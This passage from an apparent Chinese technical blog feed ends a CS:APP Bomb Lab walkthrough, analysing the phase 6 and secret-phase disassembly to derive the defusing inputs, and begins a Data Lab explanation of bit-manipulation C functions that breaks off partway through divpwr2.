<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4011ab:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx</span><br><span class="line">4011b0:	48 8d 44 24 28       	lea    0x28(%rsp),%rax</span><br><span class="line">4011b5:	48 8d 74 24 50       	lea    0x50(%rsp),%rsi</span><br><span class="line">4011ba:	48 89 d9             	mov    %rbx,%rcx</span><br><span class="line">4011bd:	48 8b 10             	mov    (%rax),%rdx</span><br><span class="line">4011c0:	48 89 51 08          	mov    %rdx,0x8(%rcx)</span><br><span class="line">4011c4:	48 83 c0 08          	add    $0x8,%rax</span><br><span class="line">4011c8:	48 39 f0             	cmp    %rsi,%rax</span><br><span class="line">4011cb:	74 05                	je     4011d2 &lt;phase_6+0xde&gt;</span><br><span class="line">4011cd:	48 89 d1             	mov    %rdx,%rcx</span><br><span class="line">4011d0:	eb eb                	jmp    4011bd &lt;phase_6+0xc9&gt;</span><br><span class="line">4011d2:	48 c7 42 08 00 00 00 	movq   $0x0,0x8(%rdx)</span><br></pre></td></tr></table></figure>
<p>这段代码前三行分别将<code>rsp+0x20</code>地址指向值、<code>rsp+0x28</code>的值、<code>rsp+0x50</code>的值赋给了<code>rbx</code> 、<code>rax</code>、<code>rsi</code>。第4行将<code>rbx</code>复制到<code>rcx</code>中，第5行将<code>rax</code>（<code>rsp+0x20</code>）中存放的地址复制入<code>rdx</code>，第6行将这个数据赋给了<code>rcx</code>（也就是<code>rbx</code>、<code>*(rsp+0x20)</code>）节点的指针域。下一步将<code>rax</code>增加8，指向栈中的下一个位置。再与<code>rsi</code>这个临界地址进行比较，如果<code>rax</code>超出末端则跳出这段代码到第12行的位置。</p>
<p>下面把<code>rdx</code>中存放的地址值赋给<code>rcx</code>，跳转到第5行重复过程。</p>
<p>仔细分析，这个过程其实就是按照链表节点在栈中的位置重新将链表连接起来。</p>
<p>最后跳出的第12行则是把新的表尾的指针域赋为<code>NULL</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4011d9:	00 </span><br><span class="line">4011da:	bd 05 00 00 00       	mov    $0x5,%ebp</span><br><span class="line">4011df:	48 8b 43 08          	mov    0x8(%rbx),%rax</span><br><span class="line">4011e3:	8b 00                	mov    (%rax),%eax</span><br><span class="line">4011e5:	39 03                	cmp    %eax,(%rbx)</span><br><span class="line">4011e7:	7d 05                	jge    4011ee &lt;phase_6+0xfa&gt;</span><br><span class="line">4011e9:	e8 4c 02 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">4011ee:	48 8b 5b 08          	mov    0x8(%rbx),%rbx</span><br><span class="line">4011f2:	83 ed 01             	sub    $0x1,%ebp</span><br><span class="line">4011f5:	75 e8                	jne    4011df &lt;phase_6+0xeb&gt;</span><br><span class="line">4011f7:	48 83 c4 50          	add    $0x50,%rsp</span><br><span class="line">4011fb:	5b                   	pop    %rbx</span><br><span class="line">4011fc:	5d                   	pop    %rbp</span><br><span class="line">4011fd:	41 5c                	pop    %r12</span><br><span class="line">4011ff:	41 5d                	pop    %r13</span><br><span class="line">401201:	41 5e                	pop    %r14</span><br><span class="line">401203:	c3                   	retq</span><br></pre></td></tr></table></figure>
<p>第2行将<code>ebp</code>赋上<code>0x5</code>，第三行中<code>rbx</code>的值是之前的<code>rsp+0x20</code>，那么<code>rbx+0x8</code>这个地址中存放的值就是下一个节点的地址，赋给了<code>rax</code>。</p>
<p>第4行将<code>rax</code>代表的节点的数据取出放入<code>eax</code>，再与<code>rbx</code>代表的节点的数据的值的低4位进行比较，如果前一个节点的数据的低4字节大于等于后一个节点的，则跳过引爆代码。</p>
<p>第8行又是熟悉的操作：使<code>rbx</code>指向下一个节点。</p>
<p>第9、10行减小<code>ebp</code>这个循环变量再进行判断，保证循环进行5次。</p>
<p>也就是说，我们需要使新的链表中前一个节点存放的数据值的低4字节都大于后一个节点的。</p>
<p>弄清楚了过程，下面就可以开始反推答案了：</p>
<p>先找到正确的链表节点排列，根据图：</p>
<p><img src="/images/bomblab8.png" alt=""></p>
<p>数据由大到小的排列依次是<code>3 4 5 6 1 2</code>。</p>
<p>由于有一步x = 7 - x，所以倒推回来的答案应该是：</p>
<p><code>4 3 2 1 6 5</code></p>
<h4 id="秘密阶段"><a href="#秘密阶段" class="headerlink" title="秘密阶段"></a>秘密阶段</h4><p>在之前C代码的暗示以及我们查看汇编代码的过程中都可以猜测出有一个秘密阶段的存在，<code>secret_phase</code>的代码就在<code>phase_6</code>后的<code>func7</code>之后。第一个问题是我们如何进入<code>secret_phase</code>。</p>
<p>这里可以用一个简单的方法，直接在反汇编代码中搜索<code>secret_phase</code>的入口地址，很快就可以发现在每个阶段的<code>phase_x</code>之后都有一行<code>phase_defused</code>，就在这个函数里面存在<code>callq secret_phase</code>的代码。</p>
<p>我们就开始分析这个<code>phase_defused</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000004015c4 &lt;phase_defused&gt;:</span><br><span class="line">  4015c4:	48 83 ec 78          	sub    $0x78,%rsp</span><br><span class="line">  4015c8:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax</span><br><span class="line">  4015cf:	00 00 </span><br><span class="line">  4015d1:	48 89 44 24 68       	mov    %rax,0x68(%rsp)</span><br><span class="line">  4015d6:	31 c0                	xor    %eax,%eax</span><br><span class="line">  4015d8:	83 3d 81 21 20 00 06 	cmpl   $0x6,0x202181(%rip)        # 603760 &lt;num_input_strings&gt;</span><br><span class="line">  4015df:	75 5e                	jne    40163f &lt;phase_defused+0x7b&gt;</span><br><span class="line">  4015e1:	4c 8d 44 24 10       	lea    0x10(%rsp),%r8</span><br><span class="line">  4015e6:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx</span><br><span class="line">  4015eb:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx</span><br><span class="line">  4015f0:	be 19 26 40 00       	mov    $0x402619,%esi</span><br><span class="line">  4015f5:	bf 70 38 60 00       	mov    $0x603870,%edi</span><br><span class="line">  4015fa:	e8 f1 f5 ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  4015ff:	83 f8 03             	cmp    $0x3,%eax</span><br><span class="line">  401602:	75 31                	jne    401635 &lt;phase_defused+0x71&gt;</span><br><span class="line">  401604:	be 22 26 40 00       	mov    $0x402622,%esi</span><br><span class="line">  401609:	48 8d 7c 24 10       	lea    0x10(%rsp),%rdi</span><br><span class="line">  40160e:	e8 25 fd ff ff       	callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">  401613:	85 c0                	test   %eax,%eax</span><br><span class="line">  401615:	75 1e                	jne    401635 &lt;phase_defused+0x71&gt;</span><br><span class="line">  401617:	bf f8 24 40 00       	mov    $0x4024f8,%edi</span><br><span class="line">  40161c:	e8 ef f4 ff ff       	callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  401621:	bf 20 25 40 00       	mov    $0x402520,%edi</span><br><span class="line">  401626:	e8 e5 f4 ff ff       	callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  40162b:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401630:	e8 0d fc ff ff       	callq  401242 &lt;secret_phase&gt;</span><br><span class="line">  401635:	bf 58 25 40 00       	mov    $0x402558,%edi</span><br><span class="line">  40163a:	e8 d1 f4 ff ff       	callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  40163f:	48 8b 44 24 68       	mov    0x68(%rsp),%rax</span><br><span class="line">  401644:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax</span><br><span class="line">  40164b:	00 00 </span><br><span class="line">  40164d:	74 05                	je     401654 &lt;phase_defused+0x90&gt;</span><br><span class="line">  40164f:	e8 dc f4 ff ff       	callq  400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">  401654:	48 83 c4 78          	add    $0x78,%rsp</span><br><span class="line">  401658:	c3                   	retq</span><br></pre></td></tr></table></figure>
<p>可以看到第7行将函数<code>num_input_strings</code>的返回值与6进行比较，如果不等于6则的直接跳过中间代码到达最后的结束部分。</p>
<p>从函数名我们可以推测这个函数的作用的是检测读取的字符串的数量，当读取了6个字符串时，就不会跳过中间的代码。我们继续看中间的代码：</p>
<p>第9到14行又是熟悉的<code>sscanf</code>调用过程，我们已经知道<code>esi</code>指向的是格式化字符串的首地址，我们先来查看它的内容：</p>
<p><img src="/images/bomblab9.png" alt=""></p>
<p>读取两个整数和一个字符串。</p>
<p>有所不同的是在12行之后又有一行给<code>edi</code>赋上了一个地址值，我们之前所有阶段中<code>edi</code>的值都是来自于我们<code>read_line</code>的地址，想到<code>sscanf</code> 参数中确实存在一个输入，我们可以推测这个<code>edi</code>中存放的是我们读取位置的首地址。</p>
<p>那么我们就可以在运行时查看这个地址的内容，看是从哪里进行读取的：</p>
<p><img src="/images/bomblab10.png" alt=""></p>
<p>首先符号表告诉我们这段数据的名字叫做<code>input_strings</code>也就是我们输入的字符串，那么这个地址上的<code>0 0</code>代表的应该就是我们的第4行输入。两个整型数字正好与格式化字符串也是匹配的。现在我们知道，应该在这两个0之后再追加一个字符串作为输入。</p>
<p>第15、16行对成功输入的数据个数进行了一个判断，如果不为3个则跳过调用<code>secret_phase</code>的代码。</p>
<p>第17-19行是对<code>strings_not_equal</code>的调用，我们已经知道它的两个参数分别是<code>esi</code>与<code>edi</code>，<code>esi</code>被赋上了一个地址值，<code>edi</code>被赋上了<code>esp+0x10</code>，我们可以推测出<code>edi</code>的地址就是指向我们读入的第三个字符串的，那么需要比较的对象是什么呢？我们在运行时查看内存的内容：</p>
<p><img src="/images/bomblab11.png" alt=""></p>
<p>这就是我们需要的第三个参数。</p>
<p>可以看到如果第三个参数与上面这个字符串相同的话就会调用两次<code>puts</code>输出提示信息，然后进入<code>secret_phase</code>阶段。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000401242 &lt;secret_phase&gt;:</span><br><span class="line">  401242:	53                   	push   %rbx</span><br><span class="line">  401243:	e8 56 02 00 00       	callq  40149e &lt;read_line&gt;</span><br><span class="line">  401248:	ba 0a 00 00 00       	mov    $0xa,%edx</span><br><span class="line">  40124d:	be 00 00 00 00       	mov    $0x0,%esi</span><br><span class="line">  401252:	48 89 c7             	mov    %rax,%rdi</span><br><span class="line">  401255:	e8 76 f9 ff ff       	callq  400bd0 &lt;strtol@plt&gt;</span><br><span class="line">  40125a:	48 89 c3             	mov    %rax,%rbx</span><br><span class="line">  40125d:	8d 40 ff             	lea    -0x1(%rax),%eax</span><br><span class="line">  401260:	3d e8 03 00 00       	cmp    $0x3e8,%eax</span><br><span class="line">  401265:	76 05                	jbe    40126c &lt;secret_phase+0x2a&gt;</span><br><span class="line">  401267:	e8 ce 01 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40126c:	89 de                	mov    %ebx,%esi</span><br><span class="line">  40126e:	bf f0 30 60 00       	mov    $0x6030f0,%edi</span><br><span class="line">  401273:	e8 8c ff ff ff       	callq  401204 &lt;fun7&gt;</span><br><span class="line">  401278:	83 f8 02             	cmp    $0x2,%eax</span><br><span class="line">  40127b:	74 05                	je     401282 &lt;secret_phase+0x40&gt;</span><br><span class="line">  40127d:	e8 b8 01 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401282:	bf 38 24 40 00       	mov    $0x402438,%edi</span><br><span class="line">  401287:	e8 84 f8 ff ff       	callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  40128c:	e8 33 03 00 00       	callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">  401291:	5b                   	pop    %rbx</span><br><span class="line">  401292:	c3                   	retq</span><br></pre></td></tr></table></figure>
<p>可以看到第3行调用了<code>read_line</code>函数，接着把<code>read_line</code>的返回值赋给了<code>rdi</code>，并调用了<code>strtol</code>函数，这个标准库函数的作用是把一个字符串转换成对应的长整型数值。返回值还是存放在<code>rax</code>中，第8行将<code>rax</code>复制给了<code>rbx</code>，第9行将<code>rax</code>减1赋给<code>eax</code>，第十行与<code>0x3e8</code>进行比较，如果这个值小于等于<code>0x3e8</code>就跳过引爆代码。看到这里我们可以知道我们需要再加入一行数据，它应该是一个小于等于1001的数值。</p>
<p>接下来将<code>ebx</code>赋给了<code>esi</code>，也就是我们一开始输入的<code>rax</code>值。第14行将一个地址值赋给了<code>edi</code>，15行调用了<code>fun7</code>函数。我们还是先往下了解一下我们需要得到的结果。</p>
<p>函数返回后令返回值<code>eax</code>与<code>0x2</code>做了一个比较，如果相等则跳过引爆代码。</p>
<p>所以我们需要返回2。</p>
<p>下面查看<code>fun7</code>的代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000401204 &lt;fun7&gt;:</span><br><span class="line">  401204:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  401208:	48 85 ff             	test   %rdi,%rdi</span><br><span class="line">  40120b:	74 2b                	je     401238 &lt;fun7+0x34&gt;</span><br><span class="line">  40120d:	8b 17                	mov    (%rdi),%edx</span><br><span class="line">  40120f:	39 f2                	cmp    %esi,%edx</span><br><span class="line">  401211:	7e 0d                	jle    401220 &lt;fun7+0x1c&gt;</span><br><span class="line">  401213:	48 8b 7f 08          	mov    0x8(%rdi),%rdi</span><br><span class="line">  401217:	e8 e8 ff ff ff       	callq  401204 &lt;fun7&gt;</span><br><span class="line">  40121c:	01 c0                	add    %eax,%eax</span><br><span class="line">  40121e:	eb 1d                	jmp    40123d &lt;fun7+0x39&gt;</span><br><span class="line">  401220:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401225:	39 f2                	cmp    %esi,%edx</span><br><span class="line">  401227:	74 14                	je     40123d &lt;fun7+0x39&gt;</span><br><span class="line">  401229:	48 8b 7f 10          	mov    0x10(%rdi),%rdi</span><br><span class="line">  40122d:	e8 d2 ff ff ff       	callq  401204 &lt;fun7&gt;</span><br><span class="line">  401232:	8d 44 00 01          	lea    0x1(%rax,%rax,1),%eax</span><br><span class="line">  401236:	eb 05                	jmp    40123d &lt;fun7+0x39&gt;</span><br><span class="line">  401238:	b8 ff ff ff ff       	mov    $0xffffffff,%eax</span><br><span class="line">  40123d:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  401241:	c3                   	retq</span><br></pre></td></tr></table></figure>
<p>第3、4两行先对我们输入的这个数作一个判断，如果等于0直接跳到第19行，返回-1，这显然不是我们想要的结果。</p>
<p>第5行将<code>rdi</code>的值读入到了<code>edx</code>中，第6行则将这个数与我们读入的数进行比较，如果这个数小于等于我们读入的数就跳至第12行，第12行将<code>eax</code>置0，再进行一次相同的比较，如果相等则跳至第20行返回。</p>
<p>如果不等（也就是<code>edx</code>小于我们读入的数），则继续向下执行第15行，这行代码有些与之前的链表跳至下一个节点类似，到这里，我们就需要查看一下<code>rdi</code>这个地址里存放的是怎样一种数据结构：</p>
<p><img src="/images/bomblab12.png" alt=""></p>
<p>仔细观察可以发现这是一个二叉树的结构，每个节点第1个8字节存放数据，第2个8字节存放左子树地址，第3个8字节存放右子树位置。并且命令也有规律，<code>nab</code>，<code>a</code>代表层数，<code>b</code>代表从左至右第b个节点。</p>
<p>根据这个结构，我们可以把树画出来以便我们进行分析。随意找了个工具表示一下：</p>
<p><img src="/images/bomblab13.png" alt=""></p>
<p>下面我们回到代码，现在我们知道第15行代码的作用是将<code>rdi</code>移到它的右子树的位置，接着调用<code>fun7</code>，在返回后令<code>eax = 2 * rax + 1</code>。</p>
<p>如果第6行的比较中树节点的值大于我们读入的数呢？</p>
<p>代码会进行到第8行，令<code>rdi</code>移到它的左子树的位置，接下来调用<code>fun7</code>在返回后令<code>eax = 2 * eax</code>。下面跳至返回处。</p>
<p>总结上面的过程：<code>edi</code>指向一个树的节点，令<code>edi</code>节点的值与我们读入的值进行比较。</p>
<ul>
<li>如果两者相等：返回0</li>
<li>如果前者大于后者：<code>rdi</code>移至左子树，返回<code>2 * rax</code></li>
<li>如果后者大于前者：<code>rdi</code>移至右子树，返回<code>2 * rax + 1</code></li>
</ul>
<p>那么我们需要返回2，应该在最后一次调用返回0，倒数第二次调用返回<code>2 * rax + 1</code>，第一次调用返回<code>2 * rax</code>。换句话说，这个数应该在第三层，比父节点大且比根结节小。观察上图，唯一的答案是：</p>
<p><code>0x16</code>（22）</p>
<hr>
<p>至此，炸弹全部解除：</p>
<p><img src="/images/bomblab14.png" alt=""></p>
<h3 id="实验小结"><a href="#实验小结" class="headerlink" title="实验小结"></a>实验小结</h3><p>整个实验包括秘密部分用时九个小时，引爆了3次炸弹（一次因为错误的尝试，两次因为将<code>ni</code>命令错打成<code>n</code>）。</p>
<p>一开始拿到题目的时候会比较蒙，需要先去学习工具的使用与一些编译的基础知道（符号表、定址表等等）花费了一些时间。前几个阶段过于关注函数的具体实现而没有根据常识去推测一些明显函数的作用花费了一些时间。</p>
<p>前4个阶段都算比较简单，考查了一些常用结构在汇编中的出现形式。第5、6与秘密阶段分别考察了堆、链表、二叉树这三个数据结构在内存中的结构与汇编级的使用，受益良多。</p>
<p>这个实验需要细致的分析与大胆的猜测与实验验证，还需要小心操作，最重要的是耐心，面对非常晦涩的汇编代码如何一步步地弄清代码的作用很需要毅力。当然也可以通过自己写出等价的C代码来帮助自己理解。</p>
]]></content>
      <categories>
        <category>Computer System</category>
        <category>CS:APP</category>
      </categories>
      <tags>
        <tag>Computer System</tag>
        <tag>CS:APP</tag>
      </tags>
  </entry>
  <entry>
    <title>深入理解计算机系统（CS:APP) - Data Lab详解</title>
    <url>/2017/06/18/CS_APP_DataLab/</url>
    <content><![CDATA[<h2 id="关于CS-APP"><a href="#关于CS-APP" class="headerlink" title="关于CS:APP"></a>关于CS:APP</h2><p>《深入理解计算机系统》(Computer Systems: A Programmer’s Perspective;CS:APP)这本书作为CMU核心课程的核心教材，一直被众人所推崇。这本书的主要内容就如它的英文名称那样：以一个程序员的视角看待计算机系统（现在的中文书名翻译给人一种这本书非常精深的错觉）。实际上这本书的内容并没有太过于深入，并且一直都作为计算机科学与技术专业低年级的计算机基础课来开设。所需要的前置知识也不是很多，一般来说学习过C语言之后就可以看了，并不需要提前学习汇编（本书第三章会讲解汇编的基础内容）。但个人感觉在学习过王爽的8086汇编以后学习本书的汇编会顺利不少。</p>
<p>我在三月份时得知本书第三版的英文版即将出版就早早预订了（第三版中文翻译版早已出版），苦苦等待一个月以后终于如愿成为了这版CS:APP的第一批读者。</p>
<p>读这本书的感受第一就是非常地爽，可以说这本书可以引领你从表层的程序一直深入到计算机内部的运作方式中，里面对于一些概念的理解也是给人一种前所未有的透彻感觉（溢出的图形表示、补码的权值理解等等）都切中了问题的本质。</p>
<p>除了书本上的内容，CMU的<a href="http://csapp.cs.cmu.edu/3e/labs.html" target="_blank" rel="noopener">课程官网上还提供了9个lab</a>，这9个lab也一直深受CMU开设的课程的学生们的喜爱，在lab中我们可以将在各章中学习到的知识运用到解决一个有趣的问题中，并且通过自动化的评分机制评估对知识的掌握程度。这9个lab同样是这本书的核心内容。</p>
<a id="more"></a>
<h2 id="Data-Lab"><a href="#Data-Lab" class="headerlink" title="Data Lab"></a>Data Lab</h2><p>实验代码见<a href="https://github.com/viseator/CS-APP-3e-labs" target="_blank" rel="noopener">GitHub</a></p>
<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>在严格限制的条件下实现简单的逻辑、补码、浮点数操作函数。</p>
<p>本lab旨在帮助学生理解C中各类型的位表示和操作符对数据的位级作用行为。</p>
<h3 id="所用工具"><a href="#所用工具" class="headerlink" title="所用工具"></a>所用工具</h3><p><code>VS Code</code>-用于代码编写<br><code>gcc</code>-用于编译</p>
<h3 id="第一部分-整数"><a href="#第一部分-整数" class="headerlink" title="第一部分 整数"></a>第一部分 整数</h3><p>所编写的程序必须满足如下要求：</p>
<ol>
<li>只能使用0-255的整型常数</li>
<li>只能使用函数参数与函数内声明的局部变量</li>
<li>只能使用如下单目操作符：! ~</li>
<li>只能使用如下双目操作符：&amp; ^ | + &lt;&lt; &gt;&gt;</li>
<li>最多只能使用有限个运算符（等于号、括号不计），可以认为使用的运算符个数越少得分越高</li>
<li>一些函数可能对操作符有更多的限制（在题目前以操作符限制给出）</li>
<li>禁止使用任何控制结构如 if do while for switch等</li>
<li>禁止定义或使用任何宏</li>
<li>禁止定义任何函数</li>
<li>禁止调用任何函数（除了可以使用printf输出中间变量，但提交时必须去掉）</li>
<li>禁止使用任何形式的类型转换</li>
<li>禁止使用int以外的任何类型（包括结构体、数组、联合体）</li>
</ol>
<p>可以假设程序在如下环境的机器上运行：</p>
<ul>
<li>采用补码表示整型</li>
<li>32位int</li>
<li>执行算术右移</li>
<li>右移超过类型的长度时的行为未定义</li>
</ul>
<h4 id="bitAnd"><a href="#bitAnd" class="headerlink" title="bitAnd"></a>bitAnd</h4><ul>
<li>要求：只用~ |实现x&amp;y</li>
<li>操作符限制：~ |</li>
<li>操作符使用数量限制：8</li>
<li>思路：略</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitAnd</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123; <span class="keyword">return</span> ~((~x) | (~y)); &#125;</span><br></pre></td></tr></table></figure>
<h4 id="getByte"><a href="#getByte" class="headerlink" title="getByte"></a>getByte</h4><ul>
<li><p>要求：取出x中的n号字节</p>
<p>编号从低位到高位从0开始</p>
</li>
<li><p>操作符使用数量限制：6</p>
</li>
<li><p>思路：将x右移n*8位之后取出低8位的值</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getByte</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> n)</span> </span>&#123; <span class="keyword">return</span> (x &gt;&gt; (n &lt;&lt; <span class="number">3</span>)) &amp; <span class="number">0xff</span>; &#125;</span><br></pre></td></tr></table></figure>
<h4 id="logicalShift"><a href="#logicalShift" class="headerlink" title="logicalShift"></a>logicalShift</h4><ul>
<li>要求：将x逻辑右移n位（0&lt;=n&lt;=31)</li>
<li>操作符使用数量限制：20</li>
<li>思路：将x的最高位除去后右移n位（保证高位补0），然后使用|操作符手动将最高位移动到的位置置上x的最高位。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalShift</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">1</span> &lt;&lt; <span class="number">31</span>;</span><br><span class="line">    <span class="keyword">return</span> ((x &amp; ~a) &gt;&gt; n) | ((!!(x &amp; a)) &lt;&lt; (<span class="number">32</span> + ~n));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="bitCount"><a href="#bitCount" class="headerlink" title="bitCount"></a>bitCount</h4><ul>
<li><p>要求：统计x的二进制表示中1的数量</p>
</li>
<li><p>操作符使用数量限制：40</p>
</li>
<li><p>思路：</p>
<p>做这道题参考了stackoverflow上的一个<a href="https://stackoverflow.com/questions/3815165/how-to-implement-bitcount-using-only-bitwise-operators" target="_blank" rel="noopener">回答</a>，核心思想是分治：</p>
<ol>
<li>将所有位分成32组，一组中只有1位</li>
<li>将相邻两组合为一组，组中的数值为原来两组中的数值相加</li>
<li>重复第2步，直到合成只有1组，组中的数值即为结果</li>
</ol>
<p>用图片比较便于理解：</p>
<p><img src="/images/bitCount.jpg" alt=""></p>
<p>可以看到最终的0x0000000F即为1的数量15</p>
<p>该算法能成功的关键在于一开始中每组中的数值即为每组中1的数量，然后将相邻两组中的数值相加的过程就相当于将之前一级的1的数量汇总，不断重复这个过程就可以将1的数量汇总到最后的一个数中。</p>
<p>有了算法我们还要考虑如何在题目的限制条件下实现这一算法。</p>
<p>为了实现将相邻两组中的值相加并放在合适的位置，我们采用掩码+位移的方式，例如有掩码：</p>
<p><code>int mask1 = 0x55555555 (0101...0101)</code></p>
<p>那么<code>x = x &amp; mask1 + (x &gt;&gt; 1) &amp; mask1;</code>实现了相加的过程，前面一部分先取出了一半的组，右移后再取出的就是后一半的组，再由按位相加的特点，它们相加后的值就存放在特定的位上（可以参照上面的图理解这一过程）。</p>
<p>接下来只要使用不同的掩码和不同的位移就可以一步步实现这一过程。</p>
<p>但是题目限制中我们只能使用0x00-0xFF的整型值，所以掩码也需要我们进行构造。</p>
<p>答案如下，注意到当剩下4组，每组8位的时候我们就可以直接位移相加再取出低8位得到它们的和。</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitCount</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// referenced :</span></span><br><span class="line">    <span class="comment">// https://stackoverflow.com/questions/3815165/how-to-implement-bitcount-using-only-bitwise-operators</span></span><br><span class="line">    <span class="keyword">int</span> mask1 = <span class="number">0x55</span>;</span><br><span class="line">    <span class="keyword">int</span> mask2 = <span class="number">0x33</span>;</span><br><span class="line">    <span class="keyword">int</span> mask3 = <span class="number">0x0F</span>;</span><br><span class="line">    <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">    mask1 = mask1 | (mask1 &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    mask1 = mask1 | (mask1 &lt;&lt; <span class="number">16</span>);</span><br><span class="line">    mask2 = mask2 | (mask2 &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    mask2 = mask2 | (mask2 &lt;&lt; <span class="number">16</span>);</span><br><span class="line">    mask3 = mask3 | (mask3 &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    mask3 = mask3 | (mask3 &lt;&lt; <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    result = (x &amp; mask1) + ((x &gt;&gt; <span class="number">1</span>) &amp; mask1);</span><br><span class="line">    result = (result &amp; mask2) + ((result &gt;&gt; <span class="number">2</span>) &amp; mask2);</span><br><span class="line">    result = (result &amp; mask3) + ((result &gt;&gt; <span class="number">4</span>) &amp; mask3);</span><br><span class="line">    <span class="keyword">return</span> (result + (result &gt;&gt; <span class="number">8</span>) + (result &gt;&gt; <span class="number">16</span>) + (result &gt;&gt; <span class="number">24</span>)) &amp; <span class="number">0xff</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="bang"><a href="#bang" class="headerlink" title="bang"></a>bang</h4><ul>
<li><p>要求：不使用!实现!操作符</p>
</li>
<li><p>操作符限制：~ &amp; ^ | + &lt;&lt; &gt;&gt;</p>
</li>
<li><p>操作符使用数量限制：12</p>
</li>
<li><p>思路：</p>
<p>!操作符的含义是0变为1，非0变为0，我们自然可以想到要做的是区分非零和零，零相对的非零数有一个非常明显的特征是-0=0，而对于非零数，取负后必定是一正一负而不可能相等，利用这一点，可以得出非零数与它的相反数进行|运算后符号位一定为1，我们将符号位取出并取反就可以返回正确的值。</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bang</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123; <span class="keyword">return</span> <span class="number">1</span> &amp; (<span class="number">1</span> ^ ((x | (~x + <span class="number">1</span>)) &gt;&gt; <span class="number">31</span>)); &#125;</span><br></pre></td></tr></table></figure>
<h4 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h4><ul>
<li>要求：返回补码表示的整型的最小值</li>
<li>操作符使用数量限制：4</li>
<li>思路：按照补码的权值理解，只要将权为-32的位置为1即可</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123; <span class="keyword">return</span> <span class="number">1</span> &lt;&lt; <span class="number">31</span>; &#125;</span><br></pre></td></tr></table></figure>
<h4 id="fitBits"><a href="#fitBits" class="headerlink" title="fitBits"></a>fitBits</h4><ul>
<li><p>要求：如果x可以l只用n位补码表示则返回1，否则返回0</p>
<p>1 &lt;= n &lt;= 32</p>
</li>
</ul>
<ul>
<li><p>操作符使用数量限制：15</p>
</li>
<li><p>思路：</p>
<p>如果x可以用n位补码表示，那么左移多余的位的个数后再右移回来的数值一定与原值相等，这个方法利用了左移后溢出的位会被丢弃，而右移回来时的是补符号位，如果丢弃了1或者右移时补的是1都会导致值的改变，而这两种情况也正说明了x不可以只用n位补码表示。</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fitsBits</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">33</span> + ~n;</span><br><span class="line">    <span class="keyword">return</span> !((x &lt;&lt; a &gt;&gt; a) ^ x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="divpwr2"><a href="#divpwr2" class="headerlink" title="divpwr2"></a>divpwr2</h4><ul>
<li>要求：计算x/(2^n) 0 &lt;= n &lt;= 30 结果向零取整</li>
</ul>
<ul>
<li>操作符使用数量限制：15</li>
<li><p>思路：对于正数，我们直接把x右移n位就可以得到向零取整的结果（实际上是向下取整）；对于负数，虽然我们右移n位可以得到结果，但是这个结果是向下取整的，所以我们需要适当地加上1来补为向零取整，那么我们什么时候需要加1呢？整除时当然不用，在不能整除时就都需要加上1来调整，如何判断是否整除？只要移出的位中有一个不为0，那么就表示无法整除。​</p>
